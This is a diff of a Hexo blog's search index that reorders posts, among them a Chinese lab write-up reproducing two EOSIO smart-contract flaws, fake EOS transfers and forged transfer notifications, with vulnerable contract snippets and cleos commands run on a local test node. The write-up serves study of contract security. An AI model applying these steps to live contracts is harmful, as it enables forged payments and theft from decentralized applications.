@@ -1,6 +1,121 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>EOSIO-Vulneribilities</title>
+    <url>/2021/12/07/EOSIO-Vulneribilities/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+<h4 id="EOSIO漏洞复现"><a href="#EOSIO漏洞复现" class="headerlink" title="EOSIO漏洞复现"></a><a href="https://github.com/lwy0518/blog_files">EOSIO漏洞复现</a></h4><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul>
+<li>nodeos ：2.0.12</li>
+<li>EOSIO.CDT（编译器）：1.2.1</li>
+<li><a href="https://github.com/gongbell/EOSFuzzer">实验数据</a></li>
+</ul>
+<hr>
+<span id="more"></span>
+
+<h5 id="准备（前一篇文章已经介绍如何创建账户等等操作）"><a href="#准备（前一篇文章已经介绍如何创建账户等等操作）" class="headerlink" title="准备（前一篇文章已经介绍如何创建账户等等操作）"></a>准备（<a href="https://lwy0518.github.io/2021/12/10/EOSIO%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#more">前一篇文章已经介绍如何创建账户等等操作</a>）</h5><ul>
+<li><p>解锁账户（默认锁定时间较短，可以自己修改配置文件使得时间更长）</p>
+<blockquote>
+<p> yourcount：指你自己创建的钱包名</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos wallet unlock -n yourcount --password</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="EOS-Fake-Transfer复现过程"><a href="#EOS-Fake-Transfer复现过程" class="headerlink" title="EOS Fake Transfer复现过程"></a>EOS Fake Transfer复现过程</h5><ul>
+<li><p>存在漏洞的合约示例（<em>test.cpp</em>）：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( code == self || action == ::eosio::<span class="built_in">string_to_name</span>(<span class="string">&quot;onerror&quot;</span>) || code == <span class="built_in">N</span>(eosio.token)) &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receiver:&quot;</span>, name&#123;receiver&#125;, <span class="string">&quot;, code:&quot;</span>, name&#123;code&#125;, <span class="string">&quot;, action:&quot;</span>, name&#123;action&#125;, <span class="string">&quot;\n&quot;</span>); </span><br><span class="line">	<span class="function">notified <span class="title">thiscontract</span><span class="params">( self )</span></span>; </span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span>( action ) &#123; </span><br><span class="line">		<span class="keyword">case</span> ::eosio::<span class="built_in">string_to_name</span>( <span class="string">&quot;transfer&quot;</span> ): </span><br><span class="line">			eosio::<span class="built_in">execute_action</span>( &amp;thiscontract, &amp;notified::transfer ); </span><br><span class="line">			<span class="keyword">break</span>; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">// doSomething()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞产生的原因</p>
+<blockquote>
+<p>由于eosio.token源代码完全公开的，所以任何人都能复制其源代码，并发布一个token（相同的名字、符号和代码），虚假的EOS和官方的唯一不同就是具有不同的发布人（<strong>issuer</strong>）。或者直接调用漏洞合约的transfer函数进行转账</p>
+</blockquote>
+</li>
+<li><p>过程</p>
+<ul>
+<li><p>创建受害者账户</p>
+<blockquote>
+<p>your key：是你自己创建的公钥，需要把公钥导入到你的钱包以及官方钱包eosio</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio victim4 <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>部署测试合约<em>test.cpp</em></p>
+<blockquote>
+<p>cleos set contract + 账户名 + 测试合约的wasm字节码所在目录 + -p + 账户@active（默认权限为active，故可加可不加）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract victim4 <span class="built_in">test</span>/ -p  victim4</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>开始模拟攻击</p>
+<ul>
+<li><p>直接调用<em>test.cpp</em>合约的<em>transfer</em>（主要目的看是否<em>trasnfer</em>中的<em>print</em>是否有输出）</p>
+<blockquote>
+<p>cleos push action + 账户名 + 需要调用的action + ‘调用action的参数’ + -p + 转账账户 （+ -j）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos push action victim4 transfer <span class="string">&#x27;[&quot;eosio&quot;,&quot;victim4&quot;,&quot;10.0000 EOS&quot;,&quot;inlined call&quot;]&#x27;</span> -p  eosio -j</span><br></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：加了一个 <strong>-j</strong> ，说明结果以json的格式进行输出的</p>
+<p>结果显示：测试合约的<strong>transfer</strong>函数被调用了</p>
+<img src="/2021/12/07/EOSIO-Vulneribilities/inlined_call.png" class="" title="inlined_call"></li>
+</ul>
+</li>
+<li><p>查询账户余额</p>
+<blockquote>
+<p> cleos get currency balance eosio.token + 查询账户 + token名（EOS)</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos get currency balance eosio.token victim4 EOS</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h5 id="Forged-Transfer-Notification复现过程"><a href="#Forged-Transfer-Notification复现过程" class="headerlink" title="Forged Transfer Notification复现过程"></a>Forged Transfer Notification复现过程</h5><ul>
+<li><p>存在漏洞的合约示例（<em>test.cpp</em>）：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(account_name from, account_name to, asset quantity, string memo)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Receiving transfer message: from &quot;</span>, name&#123;from&#125;, <span class="string">&quot; to &quot;</span>, name&#123;to&#125;, <span class="string">&quot;,&quot;</span>, quantity, <span class="string">&quot;,&quot;</span>, memo);</span><br><span class="line">    <span class="keyword">if</span> (from == _self) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;have a vulnerability!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;in eosbet transfer,&quot;</span>, name&#123; from &#125;, <span class="string">&quot;,&quot;</span>, name&#123; to &#125;);</span><br><span class="line">	<span class="comment">// doSomething()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>漏洞产生的原因</p>
+<blockquote>
+<p>攻击者在 EOS 网络中控制两个账户 A（发起攻击的账户） 和 B（将收到的通知立即转发给账户C）。通过账户 A 向账户 B 发送真正的 EOS，如图所示，eosio.token 合约在转账成功后会向 账户A、B 发送 notification。当账户 B 收到 notification后，通过调用require_recipient(C)随即将收到的通知转发给部署受害者智能合约的账户C。</p>
+</blockquote>
+</li>
+<li><p>过程</p>
+<ul>
+<li><p>创建攻击者账户<strong>sender</strong>，用于向另一个由攻击者控制的账户<strong>notifier</strong></p>
+<blockquote>
+<p>your key：是你自己创建的公钥，需要把公钥导入到你的钱包以及官方钱包eosio</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio sender <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>创建账户<strong>notifier</strong>，用于将收到的转账通知转发给受害者</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio notifier <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>创建受害者账户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio victim5 <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>账户<strong>notifier</strong>部署攻击合约<em>eosbethack.cpp</em></p>
+<blockquote>
+<p>cleos set contract + 账户名 + 测试合约的wasm字节码所在目录 + -p + 账户@active（默认权限为active，故可加可不加）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract notifier eosbethack/ -p notifier</span><br></pre></td></tr></table></figure></li>
+<li><p>账户<strong>victim5</strong>部署攻击合约<em>eosbet.cpp</em></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract victim5 eosbet/ -p victim5</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>开始模拟攻击</p>
+<ul>
+<li><p>账户<strong>sender</strong>（攻击者）向账户notifier（攻击者）发送<strong>EOS</strong>（主要目的看是否<em><strong>trasnfer</strong></em>中的<em>print</em>是否有输出）</p>
+<blockquote>
+<p>cleos push action + 账户名 + 需要调用的action + ‘调用action的参数’ + -p + 转账账户 （+ -j）</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos push action eosio.token transfer <span class="string">&#x27;[&quot;sender&quot;,&quot;notifier&quot;,&quot;10.0000 EOS&quot;,&quot;transfer himself&quot;]&#x27;</span> -p sender -j</span><br></pre></td></tr></table></figure>
+
+<p><strong>说明</strong>：加了一个 <strong>-j</strong> ，说明结果以json的格式进行输出的</p>
+<p>结果显示：测试合约的<strong>transfer</strong>函数被调用了</p>
+<p>结果显示：</p>
+<img src="/2021/12/07/EOSIO-Vulneribilities/export.png" class="" title="export"></li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>EOSIO</category>
+      </categories>
+      <tags>
+        <tag>EOSIO</tag>
+        <tag>漏洞</tag>
+        <tag>智能合约</tag>
+        <tag>防护</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>EOSIOAnalyzer架构</title>
     <url>/2021/12/13/EOSIOAnalyzer%E6%9E%B6%E6%9E%84/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -136,128 +251,13 @@
       </categories>
       <tags>
         <tag>EOSIO</tag>
+        <tag>数据流</tag>
         <tag>编译器</tag>
         <tag>漏洞检测</tag>
         <tag>静态分析</tag>
         <tag>Datalog</tag>
         <tag>CFG</tag>
         <tag>IR</tag>
-        <tag>数据流</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EOSIO-Vulneribilities</title>
-    <url>/2021/12/07/EOSIO-Vulneribilities/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-<h4 id="EOSIO漏洞复现"><a href="#EOSIO漏洞复现" class="headerlink" title="EOSIO漏洞复现"></a><a href="https://github.com/lwy0518/blog_files">EOSIO漏洞复现</a></h4><h5 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h5><ul>
-<li>nodeos ：2.0.12</li>
-<li>EOSIO.CDT（编译器）：1.2.1</li>
-<li><a href="https://github.com/gongbell/EOSFuzzer">实验数据</a></li>
-</ul>
-<hr>
-<span id="more"></span>
-
-<h5 id="准备（前一篇文章已经介绍如何创建账户等等操作）"><a href="#准备（前一篇文章已经介绍如何创建账户等等操作）" class="headerlink" title="准备（前一篇文章已经介绍如何创建账户等等操作）"></a>准备（<a href="https://lwy0518.github.io/2021/12/10/EOSIO%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#more">前一篇文章已经介绍如何创建账户等等操作</a>）</h5><ul>
-<li><p>解锁账户（默认锁定时间较短，可以自己修改配置文件使得时间更长）</p>
-<blockquote>
-<p> yourcount：指你自己创建的钱包名</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos wallet unlock -n yourcount --password</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h5 id="EOS-Fake-Transfer复现过程"><a href="#EOS-Fake-Transfer复现过程" class="headerlink" title="EOS Fake Transfer复现过程"></a>EOS Fake Transfer复现过程</h5><ul>
-<li><p>存在漏洞的合约示例（<em>test.cpp</em>）：</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( code == self || action == ::eosio::<span class="built_in">string_to_name</span>(<span class="string">&quot;onerror&quot;</span>) || code == <span class="built_in">N</span>(eosio.token)) &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;receiver:&quot;</span>, name&#123;receiver&#125;, <span class="string">&quot;, code:&quot;</span>, name&#123;code&#125;, <span class="string">&quot;, action:&quot;</span>, name&#123;action&#125;, <span class="string">&quot;\n&quot;</span>); </span><br><span class="line">	<span class="function">notified <span class="title">thiscontract</span><span class="params">( self )</span></span>; </span><br><span class="line">	<span class="built_in"><span class="keyword">switch</span></span>( action ) &#123; </span><br><span class="line">		<span class="keyword">case</span> ::eosio::<span class="built_in">string_to_name</span>( <span class="string">&quot;transfer&quot;</span> ): </span><br><span class="line">			eosio::<span class="built_in">execute_action</span>( &amp;thiscontract, &amp;notified::transfer ); </span><br><span class="line">			<span class="keyword">break</span>; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="comment">// doSomething()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>漏洞产生的原因</p>
-<blockquote>
-<p>由于eosio.token源代码完全公开的，所以任何人都能复制其源代码，并发布一个token（相同的名字、符号和代码），虚假的EOS和官方的唯一不同就是具有不同的发布人（<strong>issuer</strong>）。或者直接调用漏洞合约的transfer函数进行转账</p>
-</blockquote>
-</li>
-<li><p>过程</p>
-<ul>
-<li><p>创建受害者账户</p>
-<blockquote>
-<p>your key：是你自己创建的公钥，需要把公钥导入到你的钱包以及官方钱包eosio</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio victim4 <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>部署测试合约<em>test.cpp</em></p>
-<blockquote>
-<p>cleos set contract + 账户名 + 测试合约的wasm字节码所在目录 + -p + 账户@active（默认权限为active，故可加可不加）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract victim4 <span class="built_in">test</span>/ -p  victim4</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>开始模拟攻击</p>
-<ul>
-<li><p>直接调用<em>test.cpp</em>合约的<em>transfer</em>（主要目的看是否<em>trasnfer</em>中的<em>print</em>是否有输出）</p>
-<blockquote>
-<p>cleos push action + 账户名 + 需要调用的action + ‘调用action的参数’ + -p + 转账账户 （+ -j）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos push action victim4 transfer <span class="string">&#x27;[&quot;eosio&quot;,&quot;victim4&quot;,&quot;10.0000 EOS&quot;,&quot;inlined call&quot;]&#x27;</span> -p  eosio -j</span><br></pre></td></tr></table></figure>
-
-<p><strong>说明</strong>：加了一个 <strong>-j</strong> ，说明结果以json的格式进行输出的</p>
-<p>结果显示：测试合约的<strong>transfer</strong>函数被调用了</p>
-<img src="/2021/12/07/EOSIO-Vulneribilities/inlined_call.png" class="" title="inlined_call"></li>
-</ul>
-</li>
-<li><p>查询账户余额</p>
-<blockquote>
-<p> cleos get currency balance eosio.token + 查询账户 + token名（EOS)</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos get currency balance eosio.token victim4 EOS</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h5 id="Forged-Transfer-Notification复现过程"><a href="#Forged-Transfer-Notification复现过程" class="headerlink" title="Forged Transfer Notification复现过程"></a>Forged Transfer Notification复现过程</h5><ul>
-<li><p>存在漏洞的合约示例（<em>test.cpp</em>）：</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(account_name from, account_name to, asset quantity, string memo)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Receiving transfer message: from &quot;</span>, name&#123;from&#125;, <span class="string">&quot; to &quot;</span>, name&#123;to&#125;, <span class="string">&quot;,&quot;</span>, quantity, <span class="string">&quot;,&quot;</span>, memo);</span><br><span class="line">    <span class="keyword">if</span> (from == _self) &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;have a vulnerability!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;in eosbet transfer,&quot;</span>, name&#123; from &#125;, <span class="string">&quot;,&quot;</span>, name&#123; to &#125;);</span><br><span class="line">	<span class="comment">// doSomething()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li><p>漏洞产生的原因</p>
-<blockquote>
-<p>攻击者在 EOS 网络中控制两个账户 A（发起攻击的账户） 和 B（将收到的通知立即转发给账户C）。通过账户 A 向账户 B 发送真正的 EOS，如图所示，eosio.token 合约在转账成功后会向 账户A、B 发送 notification。当账户 B 收到 notification后，通过调用require_recipient(C)随即将收到的通知转发给部署受害者智能合约的账户C。</p>
-</blockquote>
-</li>
-<li><p>过程</p>
-<ul>
-<li><p>创建攻击者账户<strong>sender</strong>，用于向另一个由攻击者控制的账户<strong>notifier</strong></p>
-<blockquote>
-<p>your key：是你自己创建的公钥，需要把公钥导入到你的钱包以及官方钱包eosio</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio sender <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>创建账户<strong>notifier</strong>，用于将收到的转账通知转发给受害者</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio notifier <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>创建受害者账户</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos create account eosio victim5 <span class="string">&quot;your key&quot;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>账户<strong>notifier</strong>部署攻击合约<em>eosbethack.cpp</em></p>
-<blockquote>
-<p>cleos set contract + 账户名 + 测试合约的wasm字节码所在目录 + -p + 账户@active（默认权限为active，故可加可不加）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract notifier eosbethack/ -p notifier</span><br></pre></td></tr></table></figure></li>
-<li><p>账户<strong>victim5</strong>部署攻击合约<em>eosbet.cpp</em></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos <span class="built_in">set</span> contract victim5 eosbet/ -p victim5</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>开始模拟攻击</p>
-<ul>
-<li><p>账户<strong>sender</strong>（攻击者）向账户notifier（攻击者）发送<strong>EOS</strong>（主要目的看是否<em><strong>trasnfer</strong></em>中的<em>print</em>是否有输出）</p>
-<blockquote>
-<p>cleos push action + 账户名 + 需要调用的action + ‘调用action的参数’ + -p + 转账账户 （+ -j）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cleos push action eosio.token transfer <span class="string">&#x27;[&quot;sender&quot;,&quot;notifier&quot;,&quot;10.0000 EOS&quot;,&quot;transfer himself&quot;]&#x27;</span> -p sender -j</span><br></pre></td></tr></table></figure>
-
-<p><strong>说明</strong>：加了一个 <strong>-j</strong> ，说明结果以json的格式进行输出的</p>
-<p>结果显示：测试合约的<strong>transfer</strong>函数被调用了</p>
-<p>结果显示：</p>
-<img src="/2021/12/07/EOSIO-Vulneribilities/export.png" class="" title="export"></li>
-</ul>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>EOSIO</category>
-      </categories>
-      <tags>
-        <tag>EOSIO</tag>
-        <tag>漏洞</tag>
-        <tag>智能合约</tag>
-        <tag>防护</tag>
       </tags>
   </entry>
   <entry>
@@ -353,56 +353,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo NexT 主题更新</title>
-    <url>/2021/12/22/Hexo-NexT-%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-<h3 id="更新Next主题"><a href="#更新Next主题" class="headerlink" title="更新Next主题"></a>更新Next主题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ rm -rf ./themes/next</span><br><span class="line">$ cnpm install hexo-theme-next</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装第三方插件"><a href="#安装第三方插件" class="headerlink" title="安装第三方插件"></a>安装第三方插件</h3><h4 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cnpm install @next-theme/plugins</span><br></pre></td></tr></table></figure>
-
-<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim _config.next.yml</span><br></pre></td></tr></table></figure>
-
-<p>复制以下代码到_config.next.yml</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vendors:</span><br><span class="line">  plugins: local</span><br></pre></td></tr></table></figure>
-
-<hr>
-<span id="more"></span>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>Blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>EOSIO部署全过程</title>
-    <url>/2021/12/10/EOSIO%E9%83%A8%E7%BD%B2%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-
-
-<hr>
-<span id="more"></span>
-
-]]></content>
-      <categories>
-        <category>EOSIO</category>
-      </categories>
-      <tags>
-        <tag>EOSIO</tag>
-        <tag>编译器</tag>
-        <tag>漏洞检测</tag>
-        <tag>静态分析</tag>
-        <tag>Datalog</tag>
-        <tag>CFG</tag>
-        <tag>IR</tag>
-        <tag>数据流</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Typora快捷键</title>
     <url>/2021/12/21/Typora%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -467,6 +417,95 @@
       <tags>
         <tag>Typora</tag>
         <tag>Markdown</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>EOSIO部署全过程</title>
+    <url>/2021/12/10/EOSIO%E9%83%A8%E7%BD%B2%E5%85%A8%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+
+
+<hr>
+<span id="more"></span>
+
+]]></content>
+      <categories>
+        <category>EOSIO</category>
+      </categories>
+      <tags>
+        <tag>EOSIO</tag>
+        <tag>数据流</tag>
+        <tag>编译器</tag>
+        <tag>漏洞检测</tag>
+        <tag>静态分析</tag>
+        <tag>Datalog</tag>
+        <tag>CFG</tag>
+        <tag>IR</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hexo NexT 主题更新</title>
+    <url>/2021/12/22/Hexo-NexT-%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%96%B0/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+<h3 id="更新Next主题"><a href="#更新Next主题" class="headerlink" title="更新Next主题"></a>更新Next主题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ rm -rf ./themes/next</span><br><span class="line">$ cnpm install hexo-theme-next</span><br></pre></td></tr></table></figure>
+
+<h3 id="安装第三方插件"><a href="#安装第三方插件" class="headerlink" title="安装第三方插件"></a>安装第三方插件</h3><h4 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cnpm install @next-theme/plugins</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ vim _config.next.yml</span><br></pre></td></tr></table></figure>
+
+<p>复制以下代码到_config.next.yml</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vendors:</span><br><span class="line">  plugins: local</span><br></pre></td></tr></table></figure>
+
+<hr>
+<span id="more"></span>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo博客迁移到另外一台电脑</title>
+    <url>/2021/12/10/hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8F%A6%E5%A4%96%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+<h4 id="复制原电脑上的数据"><a href="#复制原电脑上的数据" class="headerlink" title="复制原电脑上的数据"></a>复制原电脑上的数据</h4><p> <strong>注：</strong>不需要全部复制</p>
+<blockquote>
+<ul>
+<li>_config.yml：站点配置文件</li>
+<li>package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮</li>
+<li>scaffolds/：layout模板文件目录，其中的md文件可以添加编辑</li>
+<li>source/：</li>
+<li>文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。<ul>
+<li>drafts：草稿文章</li>
+<li>posts：发布文章</li>
+</ul>
+</li>
+<li>themes/：主题文件</li>
+</ul>
+</blockquote>
+<hr>
+<span id="more"></span>
+
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h5><ol>
+<li>安装node</li>
+<li>安装git</li>
+<li><a href="https://lwy0518.github.io/2021/12/07/%E6%9E%84%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E8%BF%87%E7%A8%8B/#more">再参考上一篇文章</a></li>
+</ol>
+<h5 id="下载相关插件"><a href="#下载相关插件" class="headerlink" title="下载相关插件"></a>下载相关插件</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将文章部署到github上的模块</span></span><br><span class="line">$ cnpm install hexo-deployer-git --save</span><br><span class="line"><span class="comment"># 安装RSS插件</span></span><br><span class="line">$ cnpm install hexo-generator-feed --save</span><br><span class="line"><span class="comment"># 添加Sitemap,加速网页收录速度</span></span><br><span class="line">$ cnpm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -589,8 +628,8 @@
         <category>程序分析</category>
       </categories>
       <tags>
-        <tag>数据流</tag>
         <tag>程序分析</tag>
+        <tag>数据流</tag>
         <tag>Def-Use</tag>
         <tag>中间表示（IR）</tag>
       </tags>
@@ -699,45 +738,6 @@
       <tags>
         <tag>hexo</tag>
         <tag>Blog</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo博客迁移到另外一台电脑</title>
-    <url>/2021/12/10/hexo%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0%E5%8F%A6%E5%A4%96%E4%B8%80%E5%8F%B0%E7%94%B5%E8%84%91/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-<h4 id="复制原电脑上的数据"><a href="#复制原电脑上的数据" class="headerlink" title="复制原电脑上的数据"></a>复制原电脑上的数据</h4><p> <strong>注：</strong>不需要全部复制</p>
-<blockquote>
-<ul>
-<li>_config.yml：站点配置文件</li>
-<li>package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮</li>
-<li>scaffolds/：layout模板文件目录，其中的md文件可以添加编辑</li>
-<li>source/：</li>
-<li>文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。<ul>
-<li>drafts：草稿文章</li>
-<li>posts：发布文章</li>
-</ul>
-</li>
-<li>themes/：主题文件</li>
-</ul>
-</blockquote>
-<hr>
-<span id="more"></span>
-
-<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><h5 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h5><ol>
-<li>安装node</li>
-<li>安装git</li>
-<li><a href="https://lwy0518.github.io/2021/12/07/%E6%9E%84%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2%E8%BF%87%E7%A8%8B/#more">再参考上一篇文章</a></li>
-</ol>
-<h5 id="下载相关插件"><a href="#下载相关插件" class="headerlink" title="下载相关插件"></a>下载相关插件</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将文章部署到github上的模块</span></span><br><span class="line">$ cnpm install hexo-deployer-git --save</span><br><span class="line"><span class="comment"># 安装RSS插件</span></span><br><span class="line">$ cnpm install hexo-generator-feed --save</span><br><span class="line"><span class="comment"># 添加Sitemap,加速网页收录速度</span></span><br><span class="line">$ cnpm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -882,8 +882,8 @@
         <category>程序分析</category>
       </categories>
       <tags>
-        <tag>CFG</tag>
         <tag>中间表示（IR）</tag>
+        <tag>CFG</tag>
         <tag>AST</tag>
         <tag>TAC</tag>
